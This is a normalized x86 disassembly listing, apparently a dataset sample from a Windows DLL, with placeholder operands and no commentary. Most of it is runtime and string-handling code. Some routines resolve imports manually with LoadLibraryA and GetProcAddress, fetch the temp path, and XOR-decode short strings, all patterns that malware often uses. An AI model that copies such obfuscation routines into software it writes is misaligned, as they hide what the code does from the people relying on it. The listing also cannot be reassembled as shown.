call sub_10021390
add esp 0x10
mov [ ebp - 0x4 ] 0xf
cmp [ ebp - 0x54 ] 0x10
jb r-xdata
push r--data
call sub_10050437
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0x54 ] 0xf
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x68 ] 0x0
cmp ecx 0x4
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1006591f
add esp 0x4
lea eax [ esi + 0x70 ]
push eax
lea eax [ ebp - 0x174 ]
call sub_1004c5f0
push eax
push ebx
lea edi [ ebp - 0x12c ]
call sub_1001a220
mov ecx [ ebp - 0x170 ]
mov esi [ ebp - 0x174 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
push r--data
call sub_10050437
lea eax [ esi + 0x70 ]
push eax
push ebx
lea eax [ ebp - 0x174 ]
call sub_1000e9c0
mov ecx [ ebp - 0x180 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
mov [ ebp - 0x17c ] eax
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x11
call sub_1006bcb0
mov ecx eax
mov [ ebp - 0x4 ] 0x12
mov esi [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_10050437
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_10035d20
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_10050437
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x70 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x188 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x13
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x14
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x15
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_10035d20
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_10050437
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x178 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xf4 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x16
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x17
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x18
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_1006591f
add esp 0x4
lea ecx [ edi + 0x38 ]
push 0xffffffff
xor edi edi
push edi
push esi
call sub_10035d20
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_10050437
mov [ ebp - 0x38 ] 0xf
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x184 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x19
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x1a
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x1b
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x54 ]
push esi
call sub_10035d20
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_10050437
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x17c ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_100074a0
mov esi eax
lea eax [ ebp - 0x12c ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x1c
call sub_100430c0
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x1d
call sub_1006bcb0
mov esi eax
mov [ ebp - 0x4 ] 0x1e
mov ecx [ ebp - 0x170 ]
mov edi [ ebp - 0x174 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x4
ja r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_1006591f
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x70 ]
push esi
call sub_10035d20
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_10050437
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x4 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1006591f
add esp 0x4
lea ecx [ ebp - 0x148 ]
push ecx
lea edi [ ebp - 0x174 ]
call sub_10055ba0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x1f
mov [ ebp - 0x17c ] esp
push 0xffffffff
xor esi esi
push esi
lea edx [ ebp - 0x148 ]
mov edi 0xf
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_100417c0
mov eax [ ebx + 0xe0 ]
push eax
push ebx
call sub_10022030
mov ebx 0x10
mov [ ebp - 0x17c ] eax
cmp [ ebp - 0x134 ] ebx
jb r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0x134 ] edi
mov [ ebp - 0x138 ] esi
mov [ ebp - 0x148 ] 0x0
cmp [ ebp - 0x118 ] ebx
jb r-xdata
mov ecx [ ebp - 0x148 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x118 ] edi
mov [ ebp - 0x11c ] esi
mov [ ebp - 0x12c ] 0x0
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov edx [ ebp - 0x12c ]
push edx
call sub_1006591f
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] 0x0
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0xa0 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xf4 ] 0x0
cmp [ ebp - 0xfc ] ebx
jb r-xdata
mov ecx [ ebp - 0xf4 ]
push ecx
call sub_1006591f
add esp 0x4
mov [ ebp - 0xfc ] edi
mov [ ebp - 0x100 ] esi
mov [ ebp - 0x110 ] 0x0
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov edx [ ebp - 0x110 ]
push edx
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x174 ]
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xd8 ] 0x0
cmp eax esi
je r-xdata
mov eax [ ebp - 0xd8 ]
push eax
call sub_1006591f
add esp 0x4
mov [ ebp - 0x174 ] esi
mov [ ebp - 0x170 ] esi
mov [ ebp - 0x16c ] esi
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
mov ecx [ ebp - 0x17c ]
push ecx
mov ecx [ ebp - 0x170 ]
lea edx [ ebp - 0x168 ]
push edx
push ecx
push eax
call sub_10011560
mov edx [ ebp - 0x174 ]
push edx
call sub_1006591f
add esp 0x14
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xac ] esi
mov [ ebp - 0xbc ] 0x0
cmp [ ebp - 0x150 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x17c ]
mov ecx [ ebp - 0x164 ]
push ecx
call sub_1006591f
add esp 0x4
sub_100458a4
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ecx + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
mov [ esi ] al
cmp edx eax
jle r-xdata
pop esi
pop ebx
pop ebp
retn
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edx
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax edi
test edx edx
jle r-xdata
call sub_1004fd6f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov [ eax ] 0x0
test edx edx
js r-xdata
mov cl [ ebx ]
test cl cl
je r-xdata
call sub_1001d849
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ ebx ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc ebx
jmp r-xdata
push edi
call sub_10079b60
inc eax
push eax
push edi
push esi
call sub_10078db0
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
test edx edx
jg r-xdata
xor eax eax
pop edi
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_10045970
push ebp
mov ebp esp
push 0xffffffff
push sub_1008273c
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
cmp [ ebx + 0x2e4 ] 0x0
mov [ ebp - 0xe0 ] ebx
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x8
call sub_10060ac0
lea edx [ ebp - 0x34 ]
mov eax 0x2b
call sub_10060ac0
xor edi edi
mov ecx edx
cmp [ ebx + 0xb0 ] edi
jne r-xdata
mov eax 0x64
jmp r-xdata
xor eax eax
mov [ ebp - 0x50 ] ax
mov eax ecx
mov [ ebp - 0x3c ] 0x7
mov [ ebp - 0x40 ] edi
lea esi [ eax + 0x2 ]
lea ecx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov dx [ eax ]
add eax 0x2
cmp dx di
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x50 ]
call sub_100531b0
mov [ ebp - 0x4 ] edi
movzx eax [ ebx + 0x20 ]
cdq
push edx
push eax
lea esi [ ebp - 0xdc ]
call sub_10035c90
mov edi eax
lea ecx [ ebp - 0x50 ]
push ecx
lea edx [ ebp - 0xc0 ]
add ebx 0x4
push edx
mov [ ebp - 0x4 ] 0x1
call sub_10052970
push eax
mov edx r--data
lea esi [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x2
call sub_10030dc0
add esp 0x14
mov ecx eax
mov eax edi
lea edi [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x3
call sub_10044a40
mov ecx eax
mov edi [ ebp - 0xe0 ]
lea eax [ edi + 0x24 ]
lea esi [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x4
call sub_10030aa0
push eax
lea ecx [ edi + 0x2c4 ]
mov [ ebp - 0x4 ] 0x5
call sub_10036380
mov ebx 0x8
cmp [ ebp - 0x58 ] ebx
jb r-xdata
xor ecx ecx
mov esi 0x7
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] 0x0
mov [ ebp - 0x6c ] cx
cmp [ ebp - 0x90 ] ebx
jb r-xdata
mov eax [ ebp - 0x6c ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov [ ebp - 0x90 ] esi
mov [ ebp - 0x94 ] 0x0
mov [ ebp - 0xa4 ] ax
cmp [ ebp - 0x74 ] ebx
jb r-xdata
mov edx [ ebp - 0xa4 ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x78 ] 0x0
mov [ ebp - 0x88 ] dx
cmp [ ebp - 0xac ] ebx
jb r-xdata
mov ecx [ ebp - 0x88 ]
push ecx
call sub_1006591f
add esp 0x4
xor ecx ecx
mov [ ebp - 0xac ] esi
mov [ ebp - 0xb0 ] 0x0
mov [ ebp - 0xc0 ] cx
cmp [ ebp - 0xc8 ] ebx
jb r-xdata
mov eax [ ebp - 0xc0 ]
push eax
call sub_1006591f
add esp 0x4
lea esi [ edi + 0xb8 ]
push esi
push 0x104
call [ GetTempPathW@IAT ]
test eax eax
jne r-xdata
mov edx [ ebp - 0xdc ]
push edx
call sub_1006591f
add esp 0x4
cmp [ ebp - 0x3c ] ebx
jb r-xdata
mov edi r--data
mov edx 0x104
mov eax esi
sub edi esi
lea ecx [ ecx ]
xor eax eax
mov eax [ ebp - 0x50 ]
push eax
call sub_1006591f
add esp 0x4
test edx edx
jne r-xdata
movzx ecx [ edi + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
sub_10045be0
push ebp
mov ebp esp
sub esp 0x8
mov ecx [ eax + 0x8 ]
push esi
mov esi [ ecx + 0x80 ]
mov eax [ esi + ebx + 0xc ]
add esi ebx
mov [ ebp - 0x4 ] esi
test eax eax
je r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push edi
jmp r-xdata
add eax ebx
push eax
call [ LoadLibraryA@IAT ]
mov edi [ esi ]
mov esi [ esi + 0x10 ]
add edi ebx
mov ecx eax
mov eax [ edi ]
add esi ebx
mov [ ebp - 0x8 ] ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x4 ] eax
mov eax [ eax + 0xc ]
test eax eax
jne r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
pop edi
add eax ebx
jns r-xdata
add eax 0x2
and eax 0xffff
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push eax
push ecx
call [ GetProcAddress@IAT ]
add edi 0x4
mov [ esi ] eax
mov eax [ edi ]
add esi 0x4
test eax eax
jne r-xdata
sub_10045c61
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi eax
and esi 0x1f
inc ebx
mov [ ebp - 0x4 ] esi
test al 0x8
je r-xdata
test al 0x4
je r-xdata
test [ ebp + 0x10 ] bl
je r-xdata
test bl al
je r-xdata
test [ ebp + 0x10 ] 0x4
je r-xdata
push ebx
call sub_1000ea8f
pop ecx
and esi 0xfffffff7
jmp r-xdata
test al 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
push 0x4
call sub_1000ea8f
pop ecx
and esi 0xfffffffb
jmp r-xdata
test [ ebp + 0x8 ] 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_1000ea8f
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
leave
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
xor esi esi
test al 0x10
je r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_1000ea8f
pop ecx
and esi 0xffffffef
push edi
mov edi [ ebp + 0xc ]
fld [ edi ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov esi ebx
fld [ rw-data ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
mov esi ebx
fld [ edi ]
lea eax [ ebp - 0x8 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_10051187
mov ecx [ ebp - 0x8 ]
fstp [ ebp - 0x14 ]
add ecx 0xfffffa00
add esp 0xc
cmp ecx 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and [ ebp - 0x4 ] 0xfffffffd
mov esi [ ebp - 0x4 ]
push 0x10
call sub_1000ea8f
pop ecx
fldz
fcomp [ ebp - 0x14 ]
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp - 0x14 ]
mov esi ebx
fmul [ r--data ]
jmp r-xdata
fld [ rw-data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
fld [ rw-data ]
test ah 0x5
jpo r-xdata
xor edx edx
mov edx ebx
jmp r-xdata
fstp [ ebp - 0x14 ]
fchs
jmp r-xdata
test edx edx
je r-xdata
sub eax ecx
mov eax [ ebp - 0xe ]
and eax 0xf
or eax 0x10
mov [ ebp - 0xe ] ax
mov eax 0xfffffc03
cmp ecx eax
jge r-xdata
pop edi
test esi esi
je r-xdata
fld [ ebp - 0x14 ]
fstp [ edi ]
jmp r-xdata
fld [ ebp - 0x14 ]
fchs
shr [ ebp - 0x14 ] 0x1
test [ ebp - 0x10 ] bl
je r-xdata
test esi esi
jne r-xdata
shr [ ebp - 0x10 ] 0x1
dec eax
jne r-xdata
or [ ebp - 0x14 ] 0x80000000
mov esi ebx
test [ ebp - 0x14 ] bl
je r-xdata
sub_10045e45
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10007cfe
mov eax [ eax + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_1005150b
push 0x2
push 0x100
mov [ esi + 0x4 ] eax
call sub_1000977c
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
call sub_1000dcee
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
push 0x200
call sub_1000dcee
push eax
push [ esi + 0x8 ]
call sub_100796a0
add esp 0xc
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_10045ea5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1007cfe6
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10045ee0
mov eax [ edi + 0x4 ]
dec [ eax ]
jne r-xdata
retn
push ebx
mov ebx [ HeapFree@IAT ]
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
mov [ edi ] 0x0
test eax eax
je r-xdata
mov eax esi
call sub_100542e0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
pop esi
mov [ edi + 0x4 ] 0x0
pop ebx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call ebx
sub_10045f30
push ebp
mov ebp esp
push 0xffffffff
push sub_10080aa3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x180
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
xor ebx ebx
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x158 ] eax
mov [ ebp - 0x140 ] ebx
mov [ ebp - 0x150 ] ebx
xor eax eax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffd2
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0x2
jb r-xdata
lea ecx [ ebp - 0x150 ]
push ecx
lea edx [ ebp - 0x1c ]
xor eax eax
push edx
mov esi edi
mov [ ebp - 0x18 ] ax
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x40 ]
mov eax 0xda
mov [ ebp - 0x148 ] ebx
call sub_100050e0
lea eax [ ebp - 0x148 ]
push eax
mov ecx edx
push ecx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0xe2
call sub_100050e0
mov [ ebp - 0x140 ] 0x1
jmp r-xdata
lea edx [ ebp - 0xfc ]
mov eax 0x121
mov [ ebp - 0x14c ] ebx
call sub_100050e0
lea edx [ ebp - 0x14c ]
push edx
lea eax [ ebp - 0xfc ]
push eax
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0x4f
call sub_100050e0
mov [ ebp - 0x140 ] 0x2
jmp r-xdata
mov edx [ ebp - 0x150 ]
mov esi [ SysFreeString@IAT ]
push edx
call esi
mov eax [ ebp - 0x148 ]
push eax
call esi
mov ecx [ ebp - 0x14c ]
push ecx
call esi
mov edx [ ebp - 0x144 ]
push edx
call esi
mov eax [ ebp - 0x184 ]
push eax
call esi
mov ecx [ ebp - 0x188 ]
push ecx
call esi
mov eax [ ebp - 0x140 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0xc
lea edx [ ebp - 0x6c ]
mov eax 0x8d
mov [ ebp - 0x144 ] ebx
call sub_100050e0
lea ecx [ ebp - 0x144 ]
push ecx
push edx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0xea
call sub_100050e0
lea edx [ ebp - 0x4c ]
mov eax 0x104
mov [ ebp - 0x184 ] ebx
call sub_100050e0
lea eax [ ebp - 0x184 ]
push eax
mov ecx edx
push ecx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x89
call sub_100050e0
mov [ ebp - 0x140 ] 0x4
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x7a
mov [ ebp - 0x188 ] ebx
call sub_100050e0
lea edx [ ebp - 0x188 ]
push edx
lea eax [ ebp - 0x28 ]
push eax
call sub_100283d0
add esp 0x8
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0xdb
call sub_100050e0
mov [ ebp - 0x140 ] 0x5
jmp r-xdata
mov eax [ ebp - 0x184 ]
mov [ ebp - 0x154 ] ebx
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0x2d
call sub_100050e0
cmp [ ebp + 0x10 ] ebx
je r-xdata
push eax
call sub_10055686
add esp 0x4
mov [ ebp - 0x154 ] eax
xor eax eax
lea esi [ ebp - 0x180 ]
call sub_10021e80
xor eax eax
lea esi [ ebp - 0x178 ]
mov [ ebp - 0x4 ] ebx
call sub_10021e80
xor eax eax
lea esi [ ebp - 0x160 ]
call sub_10021e80
xor eax eax
lea esi [ ebp - 0x170 ]
call sub_10021e80
xor eax eax
lea esi [ ebp - 0x168 ]
call sub_10021e80
mov [ ebp - 0x4 ] 0x4
mov esi [ ebp - 0x154 ]
cmp esi 0x6
ja r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x76
call sub_100050e0
mov [ ebp - 0x140 ] 0xb
jmp [ esi * 4 + jump_table_100466a8 ]
lea edx [ ebp - 0x9c ]
mov eax 0x77
call sub_100050e0
mov [ ebp - 0x140 ] 0x6
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x53
call sub_100050e0
mov ecx [ edi ]
mov ecx [ ecx + 0x94 ]
lea edx [ ebp - 0x13c ]
push edx
lea eax [ ebp - 0x34 ]
push eax
push edi
mov [ ebp - 0x13c ] ebx
call ecx
cmp [ ebp - 0x13c ] ebx
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x49
call sub_100050e0
mov ecx [ edi ]
mov ecx [ ecx + 0x94 ]
lea edx [ ebp - 0x13c ]
push edx
lea eax [ ebp - 0x5c ]
push eax
push edi
mov [ ebp - 0x13c ] ebx
call ecx
cmp [ ebp - 0x13c ] ebx
je r-xdata
lea edx [ ebp - 0xe8 ]
mov eax 0xac
call sub_100050e0
mov ecx [ edi ]
mov ecx [ ecx + 0x94 ]
lea edx [ ebp - 0x13c ]
push edx
lea eax [ ebp - 0xe8 ]
push eax
push edi
mov [ ebp - 0x13c ] ebx
call ecx
cmp [ ebp - 0x13c ] ebx
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax 0x35
call sub_100050e0
mov eax [ edi ]
mov eax [ eax + 0x94 ]
lea ecx [ ebp - 0x13c ]
push ecx
push edx
push edi
mov [ ebp - 0x13c ] ebx
call eax
cmp [ ebp - 0x13c ] ebx
je r-xdata
lea edx [ ebp - 0x138 ]
mov eax 0xf9
call sub_100050e0
mov edx [ edi ]
mov edx [ edx + 0x94 ]
lea eax [ ebp - 0x13c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push edi
mov [ ebp - 0x13c ] ebx
call edx
cmp [ ebp - 0x13c ] ebx
je r-xdata
push 0x40
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp [ ebp - 0x180 ] ebx
je r-xdata
lea esi [ ebp - 0x168 ]
mov [ ebp - 0x4 ] 0x3
call sub_10042990
lea esi [ ebp - 0x170 ]
mov [ ebp - 0x4 ] 0x2
call sub_10042990
lea esi [ ebp - 0x160 ]
mov [ ebp - 0x4 ] 0x1
